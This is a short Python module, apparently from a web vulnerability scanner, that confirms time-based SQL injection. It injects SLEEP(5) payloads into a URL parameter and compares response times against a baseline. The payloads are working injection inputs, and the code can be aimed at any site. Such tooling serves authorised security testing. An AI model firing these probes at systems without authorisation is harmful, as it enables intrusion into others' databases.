import time, asyncio, aiohttp
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

TIME_PAYLOADS = [
    "' AND SLEEP(5)-- -",
    "\" AND SLEEP(5)-- -",
    "1) AND SLEEP(5)-- -",
]
THRESHOLD = 4.5

async def _timed(session, url):
    start = time.monotonic()
    try:
        async with session.get(url, timeout=15) as r:
            await r.text()
    except Exception:
        return 999
    return time.monotonic() - start

async def validate_sqli(url: str, param: str) -> dict | None:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)

    async with aiohttp.ClientSession() as s:
        # baseline
        qs[param] = ["1"]
        baseline_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        baseline = await _timed(s, baseline_url)

        for payload in TIME_PAYLOADS:
            qs[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            t = await _timed(s, test_url)
            if t - baseline >= THRESHOLD:
                # Re-test to avoid network flukes
                t2 = await _timed(s, test_url)
                if t2 - baseline >= THRESHOLD:
                    return {
                        "validated": True,
                        "type": "Time-based SQLi",
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Baseline={baseline:.2f}s, Injected={t2:.2f}s",
                    }
    return None
